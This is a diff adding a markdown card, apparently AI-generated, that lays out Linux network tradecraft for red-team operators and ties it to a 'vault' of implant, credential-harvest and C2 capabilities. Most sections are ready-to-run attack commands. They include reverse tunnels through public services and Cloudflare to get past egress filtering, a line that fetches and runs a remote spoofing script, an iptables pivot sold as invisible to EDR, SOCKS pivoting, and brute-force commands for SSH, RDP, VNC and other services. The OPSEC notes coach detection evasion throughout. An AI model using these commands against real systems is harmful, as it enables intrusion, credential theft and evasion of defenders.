@@ -1,0 +1,452 @@
+---
+id: RTO-network-ops
+name: Network Operations Tradecraft
+source: Red Team Ops / THC Tips-Tricks-Hacks Cheat Sheet
+category: c2-infrastructure
+analyzed_by: glm-5.2
+analysis_date: 2026-07-21
+vault_references: [T-019, T-022, T-023]
+tags: [network, tunneling, recon, socks5, proxy, exfil, bruteforce, hashcat, nmap, cloudflared, gs-netcat, socat, gost, ligolo-ng]
+---
+
+# Network Operations Tradecraft — Training Reference
+
+## TL;DR
+A Linux-side operator cheat sheet covering host discovery, packet capture, TCP/HTTPS tunnel inversion, iptables-based traffic bouncing, SOCKS proxy pivoting, IP/ASN enumeration, port scanning, hash cracking, and online brute force. This is the *red team operator's daily-driver* networking kit — complementary to the Windows-focused vault (T-022 Networking Suite, T-023 Client Capabilities `byakugan` recon, T-019 Edo Dead Drop). Where the vault provides Rust-native transports (kamui SOCKS5, juubi peer relay, http_poll, henge malleable C2), this training documents the operator-side *glue* that ties those transports into the wider engagement infrastructure.
+
+## Key Concepts
+
+1. **Egress-Resilient Tunnel Inversion** — Modern egress filtering allows outbound HTTPS but blocks inbound TCP. Operators use `localhost.run`, `remote.moe`, `cloudflared`, `serveo`, `pinggy`, `bore.pub`, and `segfault.net` to expose local ports as public HTTPS/TCP endpoints, then bridge raw TCP over the resulting WebSocket via `websocat` or `gost mwss://`. This is the same problem space as T-022's HTTP poll transport and T-019 Edo Dead Drop, but using free public infrastructure rather than owned C2.
+
+2. **iptables Kernel-Level Bouncing** — Instead of running a userspace proxy on a pivot, mark packets with `conntrack` + `MARK` and use `nat/PREROUTING DNAT` + `MASQUERADE` to bounce arbitrary TCP ports to internal hosts. Invisible to host-based EDR looking for proxy processes. No vault equivalent — the vault's pivoting (juubi peer relay) is userspace Rust; this is kernel NAT.
+
+3. **Ghost IP / Transparent Source Spoofing** — THC's `ghostip.sh` reconfigures the shell so every subsequently launched binary (nmap, cme, hydra) uses a forged source IP that doesn't exist on the wire. Pairs with segfault ROOT Servers and QEMU tunnels. No vault analog — the vault doesn't address L3 source spoofing.
+
+4. **SOCKS Pivot via gsocket / SSH -D** — Stand up a SOCKS5 listener on the target (`gs-netcat -l -S` or `ssh -D`), tunnel it back to the workstation, then drive arbitrary tools through it via `proxychains` or `graftcp`. Directly complements T-022 `kamui.rs` (SOCKS5) — kamui is the implant-side server; this training covers the operator-side client tooling.
+
+5. **CDN-Camouflaged Reverse SOCKS** — Cloudflared tunnel + SSH `ProxyCommand` + `ssh -R 1080` yields a reverse SOCKS proxy out of the target that masquerades as legitimate CDN HTTPS. Closes the gap between T-019 Edo Dead Drop's Google Translate exfil and a full interactive pivot.
+
+6. **Recon Hierarchy** — `nmap -sn -PR` for ARP LAN discovery, `-sn -PI` for ICMP, `/dev/tcp` one-liner for single-port TCP, Shodan/Censys `internetdb.shodan.io` for passive external intel, `ipinfo.io` / `ip-api.com` for geo, Cymru WHOIS for ASN. Maps onto T-023 `byakugan.rs` ARP+TCP+AD recon — byakugan is implant-side; these commands are operator-side.
+
+7. **Hash Cracking at Scale** — `hashcat` with Extreme_Breach_Masks (10-days 7-16 char hcmask), vast.ai GPU rental at $0.40/h via `dizcza/docker-hashcat:cuda`, `known_hosts` hash deobfuscation via `kh-converter.py` (mode 160). Useful when T-023 credential harvest returns NTLM/Kerberos blobs.
+
+8. **Online Brute Force Discipline** — Specific per-service scripts: `nmap --script ssh-brute/imap-brute/pop3-brute/mysql-brute/pgsql-brute/smb-brute/telnet-brute/vnc-brute/http-brute`, plus `ncrack`, `hydra`, `medusa`, Metasploit `auxiliary/scanner/vnc/vnc_login`. The training explicitly calls out GMail brute force as **impossible** (SMTP AUTH disabled) — a useful OPSEC sanity check.
+
+## Operational Techniques
+
+### Host Discovery (ARP / ICMP)
+
+- **What**: Enumerate live hosts on local and remote networks using ARP and ICMP.
+- **When to use**: Initial foothold on a LAN, validating target scope, locating live systems before deep port scans.
+- **How**:
+  1. ARP-only (LAN, fastest): `nmap -n -sn -PR -oG - 192.168.0.1/24`
+  2. ICMP (cross-segment): `nmap -n -sn -PI -oG - 192.168.0.1/24`
+  3. Parallel ICMP sweep as root:
+     ```sh
+     seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" \
+       | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
+     ```
+- **Vault link**: T-023 `byakugan.rs` performs ARP discovery from inside the implant. Use the implant to seed the first hop, then escalate to these operator commands when pivoting through a SOCKS proxy to enumerate further segments.
+- **Tool/code**: `nmap`, `ping`, `xargs -P20` for parallelism.
+- **OPSEC**: ARP sweep generates broadcast noise — every host's ARP cache will reflect the source MAC. ICMP `-sn -PI` is loud; some EDR/NDR systems flag ICMP sweeps as recon. Throttle with `-i0.2` and parallelize conservatively. Route through `ghostip.sh` first if source obfuscation is needed.
+
+### tcpdump Connection Monitoring
+
+- **What**: Live packet capture focused on new TCP connections, SSH beacons, and large-payload ASCII extraction.
+- **When to use**: During implants to confirm beaconing, detect unexpected egress, or pull ASCII from cleartext protocols.
+- **How**:
+  1. Monitor every new TCP connection: `tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'`
+  2. Audible SSH alert: `tcpdump -nplq 'tcp[13] == 2 and dst port 22' | while read -r x; do echo "${x}"; echo -en \\a; done`
+  3. ASCII extraction from large packets: `tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'`
+- **Vault link**: No direct vault analog — vault is implant-focused. Use this on operator-side pivot boxes to verify T-019 / T-022 transports are beaconing cleanly.
+- **Tool/code**: `tcpdump` with BPF filters.
+- **OPSEC**: tcpdump requires root and puts the interface in promiscuous mode; some hardened hosts log `PROMISC` syslog events. Run on owned infrastructure, not target endpoints.
+
+### TCP/SSL Bridging (socat / openssl)
+
+- **What**: Ad-hoc protocol translation between raw TCP and TLS.
+- **When to use**: Quick one-offs — testing SMTPS, bouncing a cleartext service through TLS, prototyping C2 fronting.
+- **How**:
+  - Direct SSL connect: `openssl s_client -connect smtp.gmail.com:465`
+  - stdio-to-SSL: `socat stdio openssl-connect:smtp.gmail.com:465`
+  - TCP listener → SSL bridge: `socat TCP-LISTEN:25,reuseaddr,fork openssl-connect:smtp.gmail.com:465`
+- **Vault link**: Complements T-022's `henge.rs` malleable C2 — henge builds protocol profiles at the application layer; socat/openssl handles the transport layer ad-hoc.
+- **Tool/code**: `socat`, `openssl s_client`.
+- **OPSEC**: socat creates a long-lived listener process — trivially spotted by `ps`/`netstat`. Use only on operator infrastructure or short-lived footholds.
+
+### Public Reverse TCP Ports
+
+- **What**: Obtain a random public TCP port to receive reverse-shell connections from targets behind NAT.
+- **When to use**: Implant beaconing when you don't control an external VPS, or need a quick throwaway ingress.
+- **How** (free services):
+  - **segfault.net**: `curl sf/port` then `nc -vnlp $(cat /config/self/reverse_port)`
+  - **bore.pub**: `bore local 31337 --to bore.pub`
+  - **serveo.net**: `ssh -R 0:localhost:31337 tcp@serveo.net`
+  - **pinggy.io** (60 min free): `ssh -p 443 -R 0:localhost:31337 tcp@a.pinggy.io`
+  - Other: `remote.moe`, `playit.gg`, paid `ngrok`
+- **Vault link**: T-022's `tcp_transport.rs` and T-019 Edo Dead Drop both assume operator-controlled endpoints. These services let you skip the VPS for short engagements or burnable C2 channels — useful for T-019 dead-drop bootstrap when no owned infrastructure is yet available.
+- **Tool/code**: `curl`, `nc`, `bore`, `ssh -R`, cloudflared.
+- **OPSEC**: All free services log your source IP and may publish endpoint hostnames. Never use for long-term C2. The generated subdomains are predictable enough to be scanned by Shodan/Censys within hours. T-019's blockchain dead drop is the OPSEC-superior alternative for unattended implants.
+
+### HTTPS Reverse Tunnels (Cloudflared / localhost.run / remote.moe)
+
+- **What**: Expose a local port as a temporary HTTPS URL, then tunnel raw TCP over it.
+- **When to use**: Egress filtering allows outbound HTTPS only — classic enterprise scenario.
+- **How**:
+  1. Server side establishes HTTPS ingress:
+     ```sh
+     ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
+     # or
+     ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
+     # or download cloudflared:
+     cloudflared tunnel --url http://localhost:8080 --no-autoupdate
+     ```
+  2. Bridge raw TCP over the resulting HTTPS URL:
+     - **websocat** (stdin/stdout pipe): server `websocat -s 8080`, target `websocat wss://<HTTPS-URL>`
+     - **gost** (full TCP forwarding): server `gost -L mws://:8080`, workstation `gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'`
+     - **gost** (SOCKS exit): workstation `gost -L :1080 -F 'mwss://<HTTPS-URL>:443'`, then `curl -x socks5h://0 ipinfo.io`
+- **Vault link**: T-022 `http_poll_transport.rs` is the vault's HTTP long-poll equivalent. T-019 Edo Dead Drop uses Google Translate as a CDN front. This training provides the operator-side recipe for *bridging raw TCP* through these channels — the vault's transports are message-oriented; websocat/gost provide stream-oriented wrapping.
+- **Tool/code**: `cloudflared`, `websocat`, `gost`, `ssh -R`.
+- **OPSEC**: localhost.run/remote.moe URLs are randomly generated and rotated on disconnect; cloudflared tunnels persist as long as the process runs. Cloudflare may rate-limit or fingerprint. For long-dwell C2 prefer T-019's blockchain-based dead drop which has no centralized operator to subpoena.
+
+### iptables Traffic Bouncing (Kernel NAT Pivot)
+
+- **What**: Use netfilter mark + DNAT + MASQUERADE to bounce TCP ports from a pivot host to internal targets without running any userspace proxy.
+- **When to use**: You have root on a Linux pivot inside the target network and want to expose internal services to your workstation through a stealthy kernel-level forwarder.
+- **How**:
+  ```sh
+  bounceinit() {
+      echo 1 >/proc/sys/net/ipv4/ip_forward
+      echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
+      [ $# -le 0 ] && set -- "0.0.0.0/0"
+      while [ $# -gt 0 ]; do
+          iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL \
+            -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
+          shift 1
+      done
+      iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>&1
+      iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+      iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
+      iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
+      iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+  }
+  bounce() {
+      iptables -t nat -A PREROUTING -p tcp --dport "${1:?}" -m mark --mark 1188 \
+        -j DNAT --to ${2:?}:${3:?}
+  }
+  bounceinit                              # Allow EVERY source IP
+  # bounceinit "1.2.3.4/16" "6.6.0.0/16" # Allow only these sources
+  bounce 31337 144.76.220.20 22
+  bounce 31338 127.0.0.1 8080
+  ```
+- **Vault link**: T-022 `juubi.rs` peer relay and `kamui.rs` SOCKS5 are the vault's userspace pivoting primitives. iptables bouncing is invisible to host EDR scanning for relay processes — strictly more stealthy when root on Linux. No vault equivalent.
+- **Tool/code**: `iptables`, `Hackshell` `bounce` function.
+- **OPSEC**: No userspace process to find in `ps`. Syslog may log iptables rule additions if `klog` is configured. Mark `1188` is a magic number — change it per engagement to avoid signature detection. `ip_forward=1` is a permanent kernel state change; restore on cleanup. Works through Deep Firewall networks to reach the gs-netcat relay network: `GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh`.
+
+### Ghost IP Source Spoofing
+
+- **What**: Reconfigure the shell so all subsequently launched binaries use a fake source IP that doesn't exist on the local network.
+- **When to use**: Operating from a foothold inside the target network where you want every attack (nmap, cme, hydra) to appear to originate from a non-existent host.
+- **How**:
+  ```sh
+  source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+  ```
+  Pairs with segfault ROOT Servers (WireGuard into target network with Ghost IP) and QEMU tunnels.
+- **Vault link**: No vault analog — the vault does not implement L3 source spoofing. T-020 Anti-Analysis covers VM/EDR detection but not source address camouflage.
+- **Tool/code**: `ghostip.sh` (THC).
+- **OPSEC**: Spoofed source breaks return traffic — works only for one-way attacks (e.g., blind UDP scans, certain TCP injection scenarios) or when combined with on-path response rewriting. Verify with `tcpdump` on a span port before relying on it for sensitive actions.
+
+### CDN-Camouflaged Reverse SOCKS (SSH over Cloudflare)
+
+- **What**: Reverse SOCKS proxy out of the target, fully camouflaged as Cloudflare HTTPS.
+- **When to use**: Target egress permits only Cloudflare-fronted HTTPS; you need interactive pivot into the internal network.
+- **How**:
+  1. CF Dashboard → Zero Trust → Networks → Tunnels → new Cloudflared tunnel.
+  2. Extract the full Token from the grayed-out `sudo cloudflared service install <TunnelTokenHere>` text.
+  3. Add subdomain `ssh.team-teso.net`, Type=TCP URL=localhost:22.
+  4. Workstation: `cloudflared tunnel run --token TunnelTokenHere`
+  5. Target: `ssh -o ProxyCommand="cloudflared access tcp --hostname ssh.team-teso.net" root@0 -R 1080`
+  6. Workstation access: `curl -x socks5h://0 https://ipinfo.io`
+  7. Use ProxyChains/GrafTCP for everything else.
+- **Vault link**: T-019 Edo Dead Drop uses Google Translate as a CDN front; this is the interactive-pivot analog using Cloudflare Zero Trust. T-022 `kamui.rs` SOCKS5 + this CDN front = full EDR-invisible pivot.
+- **Tool/code**: `cloudflared`, `ssh -R`, `proxychains`, `graftcp`.
+- **OPSEC**: Requires CF subscription. Cloudflare may log tunnel traffic for the account owner. The `cloudflared` binary on the target is a known indicator — consider T-021's string obfuscation if deploying a modified build. DNS to `ssh.team-teso.net` is observable; use a benign-looking subdomain.
+
+### SOCKS Pivot Tooling (proxychains / graftcp)
+
+- **What**: Drive arbitrary tools through an established SOCKS proxy into the target network.
+- **When to use**: After establishing `gs-netcat -l -S` or `ssh -D` listener on the target.
+- **How**:
+  - Establish tunnel:
+    - Target: `gs-netcat -l -S`
+    - Workstation: `gs-netcat -p 1080`
+  - ProxyChains:
+    ```sh
+    echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
+    proxychains -f pc.conf -q curl ipinfo.io
+    proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
+    seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{}
+    ```
+  - GrafTCP:
+    ```sh
+    graftcp-local -select_proxy_mode only_socks5 &
+    graftcp curl ipinfo.io
+    graftcp ssh root@192.168.1.1
+    graftcp nmap -n -Pn -sV -F --open 192.168.1.1
+    ```
+- **Vault link**: T-022 `kamui.rs` is the implant-side SOCKS5 server. These commands are the operator-side clients that consume kamui's listener. `juubi.rs` peer relay provides multi-hop SOCKS chaining — ProxyChains is the workstation equivalent.
+- **Tool/code**: `gs-netcat`, `proxychains`, `graftcp` / `graftcp-local`.
+- **OPSEC**: `proxychains` wraps only programs that explicitly honor `LD_PRELOAD`; static binaries and Go/Rust statically-linked tools (like the vault's client) will bypass it. Use `graftcp` (ptrace-based) for those. Parallel scans via `xargs -P10` multiply noise — spread over time.
+
+### Public IP / Geo / ASN Enumeration
+
+- **What**: Quickly determine your egress IP, geolocate arbitrary IPs, and resolve ASN ownership.
+- **When to use**: Validating implant callback source, attributing adversary infrastructure, scoping CIDR ownership before scanning.
+- **How**:
+  - Public IP:
+    ```sh
+    curl -s wtfismyip.com/json | jq
+    curl ifconfig.me
+    dig +short myip.opendns.com @resolver1.opendns.com
+    host myip.opendns.com resolver1.opendns.com
+    ```
+  - Geo:
+    ```sh
+    curl https://ipinfo.io/8.8.8.8 | jq
+    curl http://ip-api.com/8.8.8.8
+    curl https://cli.fyi/8.8.8.8
+    ```
+  - ASN (single or bulk via Cymru WHOIS):
+    ```sh
+    asn() {
+      [[ -n $1 ]] && { echo -e "begin\nverbose\n${1}\nend"|netcat whois.cymru.com 43| tail -n +2; return; }
+      (echo -e 'begin\nverbose';cat -;echo end)|netcat whois.cymru.com 43|tail -n +2
+    }
+    asn 1.1.1.1
+    cat IPS.txt | asn
+    ```
+  - Tor check: `curl -x socks5h://localhost:9050 -s https://check.torproject.org/api/ip` → expect `{"IsTor":true...}`
+- **Vault link**: T-023 `byakugan.rs` performs ARP/TCP/AD recon from the implant. These commands are operator-side complements for attribution and egress verification — feed results back into T-022's malleable C2 profile to match expected geo.
+- **Tool/code**: `curl`, `dig`, `host`, `netcat whois.cymru.com 43`.
+- **OPSEC**: Every query leaks your real source IP to a third-party service. Use Tor (`socks5h://localhost:9050`) for sensitive lookups, or perform them from a pivot box.
+
+### Global Reachability Checks
+
+- **What**: Verify reachability from multiple geographic vantage points and detect local censorship.
+- **When to use**: Confirming CDN-fronted C2 is globally accessible; identifying DPI/censorship on target network.
+- **How**:
+  - Multi-vantage ping/traceroute/mtr/port-check: `https://ping.pe/`
+  - OONI Probe for local reachability:
+    ```sh
+    ooniprobe run im
+    ooniprobe run websites
+    ooniprobe list
+    ooniprobe list 1
+    ```
+- **Vault link**: T-019 Edo Dead Drop's reliance on Google Translate / blockchain public endpoints means global reachability is mission-critical. Use OONI from a target-internal foothold to verify those endpoints are reachable through the local DPI.
+- **Tool/code**: `ping.pe`, `ooniprobe`.
+- **OPSEC**: OONI Probe is a known censorship-measurement tool — its presence on a target box is a strong indicator of red team activity. Use only on owned/throwaway footholds.
+
+### Port Scanning (External + Internal)
+
+- **What**: Passive (Shodan/Censys) and active (nmap, /dev/tcp) port enumeration.
+- **When to use**: Target scope validation, exposed-service discovery, single-host quick check.
+- **How**:
+  - Passive external:
+    ```sh
+    curl https://internetdb.shodan.io/1.1.1.1
+    ```
+  - nmap fast version + vuln:
+    ```sh
+    nmap -n -Pn -sCV -F --open --min-rate 10000 scanme.nmap.org
+    nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
+    ```
+  - Bash port-scanner wrapper (Hackshell `scan`):
+    ```sh
+    _scan_single() {
+        local opt=("${2}")
+        [ -f "$2" ] && opt=("-iL" "$2")
+        nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
+    }
+    scan() {
+        local port="${1:?}"
+        shift 1
+        for ip in "$@"; do _scan_single "$port" "$ip"; done
+    }
+    scan 22,80,443 192.168.0.1
+    scan - 192.168.0.1-254 10.0.0.1-254
+    ```
+  - Single-port TCP bash:
+    ```sh
+    timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
+    ```
+- **Vault link**: T-023 `byakugan.rs` performs TCP recon from the implant. The vault's recon is geared toward finding internal AD/HTTP services to pivot into; these operator commands extend coverage to external perimeter and pre-engagement intel.
+- **Tool/code**: `nmap`, Shodan `internetdb`, Censys, Hackshell `scan`, `/dev/tcp`.
+- **OPSEC**: nmap with `--min-rate 10000` is fast but extremely noisy — IDS will alert. Use through ProxyChains over a SOCKS pivot so the source appears to be the pivot, not your workstation. `/dev/tcp` one-liner is the lowest-noise option for confirming a single port.
+
+### Hash Cracking
+
+- **What**: Offline hash recovery using hashcat, GPU clusters, and curated hcmasks.
+- **When to use**: NTLM/Kerberos hashes captured via T-023 credential harvest, WPA handshakes from wireless assessment, `known_hosts` IP recovery.
+- **How**:
+  - NTLM lookup: `https://ntlm.pw/`
+  - WPA lookup: `https://wpa-sec.stanev.org`
+  - Basic hashcat: `hashcat my-hash /usr/share/wordlists/rockyou.txt`
+  - Extreme Breach Masks on GPU:
+    ```sh
+    curl -fsSL https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask -o 10-days_7-16.hcmask
+    nice -n 19 hashcat -o cracked.txt my-hash.txt -w1 -a3 10-days_7-16.hcmask -O -d2
+    # -d2: GPU #2 only, -O: ≤15 char speedup, -w1: low workload
+    ```
+  - known_hosts IP recovery:
+    ```sh
+    curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -O
+    curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/kh-converter.py -O
+    python3 kh-converter.py ~/.ssh/known_hosts >known_hosts_hashes
+    hashcat -m 160 --quiet --hex-salt known_hosts_hashes -a 3 ipv4_hcmask.txt
+    ```
+  - Cloud GPU rental: vast.ai RTX-4090 at $0.40/h via `dizcza/docker-hashcat:cuda` container.
+  - Alternative services: Crackstation, shuck.sh, ColabCat, Cloudtopolis, AWS.
+- **Vault link**: T-023 client capabilities include credential harvest (`harvest/lsass_dump.rs`, WiFi extract). T-021 Crypto & Obfuscation provides AES-GCM+zstd for exfil but does not crack. This training fills the post-exfil cracking gap.
+- **Tool/code**: `hashcat`, `ntlm.pw`, `wpa-sec.stanev.org`, `vast.ai`, `dizcza/docker-hashcat`, Crackstation, shuck.sh, ColabCat, Cloudtopolis.
+- **OPSEC**: `$6$` (SHA-512 crypt) is brutally slow — a 1-minute 7-16 char mask takes days on 8×RTX4090. Don't waste cycles; pivot to vast.ai cloud GPU. Uploading hashes to ntlm.pw / Crackstation publishes them — never submit hashes from active engagements to public lookup services.
+
+### Online Brute Force
+
+- **What**: Online credential guessing against specific services (SSH, RDP, FTP, IMAP, POP3, MySQL, PostgreSQL, SMB, Telnet, VNC, HTTP basic auth).
+- **When to use**: Post-recon when valid services are identified and no credentials recovered via other means.
+- **How**:
+  - Wordlist setup:
+    ```sh
+    ULIST="/usr/share/wordlists/brutespray/mysql/user"
+    PLIST="/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"
+    T="192.168.0.1"
+    ```
+  - SSH: `nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"` / `ncrack -P "${PLIST}" --user root "ssh://${T}"` / `hydra -P "${PLIST}" -l root "ssh://$T"`
+  - RDP: `ncrack -P "${PLIST}" --user root -p3389 "${T}"` / `hydra -P "${PLIST}" -l root "rdp://$T"`
+  - FTP: `hydra -P "${PLIST}" -l user "ftp://$T"`
+  - IMAP: `nmap -p 143,993 --script imap-brute "$T"`
+  - POP3: `nmap -p110,995 --script pop3-brute "$T"`
+  - MySQL: `nmap -p3306 --script mysql-brute "$T"`
+  - PostgreSQL: `nmap -p5432 --script pgsql-brute "$T"`
+  - SMB: `nmap --script smb-brute "$T"`
+  - Telnet: `nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"`
+  - VNC: `nmap -p5900 --script vnc-brute "$T"` / `ncrack -P "${PLIST}" --user root "vnc://$T"` / `hydra -P "${PLIST}" "vnc://$T"` / `medusa -P "${PLIST}" -u root -M vnc -h "$T"`
+  - VNC via Metasploit:
+    ```
+    msfconsole
+    use auxiliary/scanner/vnc/vnc_login
+    set rhosts 192.168.0.1
+    set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
+    run
+    ```
+  - HTTP basic auth:
+    ```sh
+    echo admin >user.txt
+    echo -e "blah\naaddd\nfoobar" >pass.txt
+    nmap -p80 --script http-brute --script-args \
+      http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,\
+      userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
+      pentesteracademylab.appspot.com
+    ```
+  - Useful Hydra flags: `-t4` (4 tasks), `-l root`, `-V` (verbose), `-s 31337` (port), `-S` (SSL), `-f` (exit after first valid).
+- **Vault link**: No vault primitive — the vault's T-023 capabilities include `harvest/lsass_dump.rs`, `harvest/wmi_exec.rs`, but not external service brute force. T-019 dead drop could relay hydra output back to operator. T-021's UAC bypass (`escalation/uac.rs`) and `harvest/extract_wifi.rs` cover some credential scenarios.
+- **Tool/code**: `nmap --script *-brute`, `ncrack`, `hydra`, `medusa`, Metasploit `auxiliary/scanner/vnc/vnc_login`.
+- **OPSEC**: **GMail brute force is impossible** — SMTP AUTH is disabled, all GMail brute force tools are fake. For everything else, account lockout policies will trigger after a small number of attempts — prefer `brute.firstOnly` to exit on first valid credential. SSH brute force generates massive auth log noise (`/var/log/auth.log`); rotate source IPs via `ghostip.sh` or ProxyChains. VNC has no native rate limiting and accepts quick parallel attempts.
+
+## Tool & Tradecraft Reference
+
+| Tool/Command | Purpose | OPSEC Notes |
+|---|---|---|
+| `nmap -n -sn -PR` | ARP LAN discovery | Broadcast noise; host ARP caches reflect source |
+| `nmap -n -sn -PI` | ICMP discovery | Loud; some NDR alert on sweeps |
+| `xargs -P20 ping` | Parallel ICMP sweep | Parallelism scales noise; throttle with `-i0.2` |
+| `tcpdump -np 'tcp[tcpflags] ^ (tcp-syn\|tcp-ack) == 0'` | New TCP connection monitor | Root required; promiscuous mode logs in syslog |
+| `socat stdio openssl-connect:host:port` | stdio ↔ TLS bridge | Long-lived listener; visible in `ps`/`netstat` |
+| `openssl s_client -connect host:port` | Direct TLS connect | One-shot; leaves shell history |
+| `curl sf/port` (segfault) | Allocate random public TCP port | Source IP logged; subdomain predictable |
+| `bore local 31337 --to bore.pub` | Random public TCP port forward | Public service; subdomain scanned by Shodan |
+| `ssh -R 0:localhost:31337 tcp@serveo.net` | Reverse TCP via SSH | Same as bore; not for long-dwell |
+| `cloudflared tunnel --url http://localhost:8080` | HTTPS reverse tunnel | Requires CF account; tunnel process visible |
+| `websocat -s 8080` / `websocat wss://URL` | WebSocket↔raw TCP | Long-lived process; identifiable binary |
+| `gost -L mws://:8080` | HTTP-WS→TCP server | Process visible; identifiable signature |
+| `gost -L tcp://:2222/host:22 -F 'mwss://URL:443'` | TCP forward via WS | Same as above |
+| `gost -L :1080 -F 'mwss://URL:443'` | SOCKS5 exit via WS | Same |
+| `iptables -t mangle ... MARK ... DNAT MASQUERADE` | Kernel-level TCP bounce | No userspace process; `ip_forward=1` persists |
+| `ghostip.sh` (THC) | Shell source IP spoofing | Breaks return traffic; pairs with on-path rewriting |
+| `gs-netcat -l -S` (target) / `gs-netcat -p 1080` (workstation) | gsocket SOCKS tunnel | gs-netcat binary on target is a known indicator |
+| `proxychains -f pc.conf -q <cmd>` | Drive tools via SOCKS | LD_PRELOAD; bypassed by static binaries |
+| `graftcp <cmd>` / `graftcp-local -select_proxy_mode only_socks5` | Ptrace-based SOCKS | Works on static binaries; ptrace may alert EDR |
+| `curl ifconfig.me` / `wtfismyip.com/json` | Public IP discovery | Leaks real source IP to third party |
+| `dig +short myip.opendns.com @resolver1.opendns.com` | DNS-based public IP | DNS-only; lighter OPSEC than HTTP |
+| `netcat whois.cymru.com 43` (asn function) | ASN lookup | Single TCP to Cymru; very low noise |
+| `curl https://internetdb.shodan.io/IP` | Passive port/host lookup | No direct target contact; uses Shodan cache |
+| `nmap -n -Pn -sCV -F --open --min-rate 10000` | Fast version scan | `--min-rate 10000` extremely loud |
+| `nmap -A --script vulners.nse` | Vuln scan | Activates NSE scripts; very loud |
+| `bash -c "</dev/tcp/1.2.3.4/31337"` | Single-port TCP check | Lowest-noise option; one SYN |
+| `ooniprobe run im` / `run websites` | Censorship/reachability test | OONI is well-known indicator of red team activity |
+| `hashcat -m 160 --hex-salt -a 3 ipv4_hcmask.txt` | known_hosts hash cracking | Local; no network noise |
+| `hashcat -a3 10-days_7-16.hcmask -O -d2 -w1` | GPU password mask attack | Local; vast.ai cloud option $0.40/h |
+| `hydra -P PLIST -l user ssh://T -t4 -V -f` | SSH online brute | Massive auth.log noise; rotate sources |
+| `ncrack -P PLIST --user root ssh://T` | SSH brute (alt) | Slower than hydra; lower per-host rate |
+| `nmap --script ssh-brute --script-args ssh-brute.timeout=4s` | SSH brute via nmap | Same auth.log noise; spreads across NSE |
+| `medusa -P PLIST -u root -M vnc -h T` | VNC brute | VNC has no native rate limit; parallelizable |
+| `msfconsole` / `auxiliary/scanner/vnc/vnc_login` | VNC brute via MSF | MSF footprint on operator box; use carefully |
+| `ssh -o ProxyCommand="cloudflared access tcp --hostname ssh.team-teso.net" root@0 -R 1080` | Reverse SOCKS via CF | cloudflared on target is known indicator |
+
+## Gaps & Extensions
+
+**What the vault covers that this training does not:**
+
+- **Implant-native SOCKS5 server** (T-022 `kamui.rs`) — the training assumes gs-netcat or ssh -D provides the listener. The vault's kamui provides a Rust-native, EDR-evading equivalent with stack spoofing and indirect syscalls.
+- **Peer relay chaining** (T-022 `juubi.rs` / `juubi_chain.rs`) — multi-hop relay with chain management. The training's ProxyChains is workstation-side only; the vault supports implant-to-implant chaining for deep pivoting.
+- **Malleable C2 profiles** (T-022 `henge.rs`) — operator-definable protocol fronting. The training's cloudflared/localhost.run are static HTTPS tunnels, not protocol-malleable.
+- **HTTP long-poll transport** (T-022 `http_poll_transport.rs`) — message-oriented pull transport. The training's tunneling is stream-oriented; the vault's poll transport fits asynchronous dead-drop comms.
+- **NT Sockets via AFD driver** (T-022 `nt_sockets.rs`) — kernel-level socket creation bypassing winsock. The training is Linux-only.
+- **Autonomous dead-drop C2** (T-019 Edo Dead Drop) — Google Translate + Ethereum blockchain + steganography. The training's cloudflared/segfault alternatives require ongoing operator interaction; Edo Dead Drop is fully autonomous.
+- **EDR evasion on the implant** — T-016 stack spoofing, AMSI/ETW patching, unhooking. The training assumes operator-side infrastructure; the vault assumes evasive implant-side execution.
+
+**What this training covers that the vault does not:**
+
+- **iptables kernel-level TCP bouncing** — strictly more stealthy than userspace proxies on Linux pivots. No vault equivalent. Candidate for a new technique card (Linux pivot primitive).
+- **Ghost IP / source IP spoofing** — L3 source camouflage. No vault primitive. Pairs well with vault recon.
+- **Free public ingress services** (segfault, bore, serveo, pinggy, localhost.run, remote.moe, cloudflared) — useful for T-019 dead-drop bootstrap before owned infrastructure is available.
+- **Cloud GPU hash cracking at scale** (vast.ai + docker-hashcat + Extreme_Breach_Masks) — operationalizes hash recovery for credentials exfilled via T-023.
+- **Curated online brute-force recipes per protocol** — direct, repeatable commands for SSH/RDP/FTP/IMAP/POP3/MySQL/PostgreSQL/SMB/Telnet/VNC/HTTP. The vault has no brute force primitive.
